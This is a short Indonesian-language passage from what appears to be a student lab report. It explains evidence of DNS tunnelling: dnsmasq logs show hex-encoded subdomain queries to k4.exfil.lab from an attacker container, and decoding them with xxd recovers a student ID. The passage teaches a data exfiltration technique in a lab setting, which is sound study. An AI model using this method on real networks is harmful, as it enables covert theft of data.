Penjelasan Bukti:

Deteksi Label Hex pada Log DNS: Pada berkas dns-k4.log, server dnsmasq mencatat adanya permintaan resolusi DNS tipe A menuju subdomain heksadesimal 3234353532303131313934.k4.exfil.lab dari container attacker (172.21.0.3), dan skrip analisis_dns.py merekap adanya aktivitas query ke domain induk exfil.lab.

Dekode Pesan Eksfiltrasi: Payload label heksadesimal 3234353532303131313934 berhasil didekode kembali menggunakan xxd -r -p menjadi pesan asli NIM mahasiswa, yaitu 24552011194, yang membuktikan bahwa data sensitif dapat diselundupkan keluar melalui label subdomain query DNS.
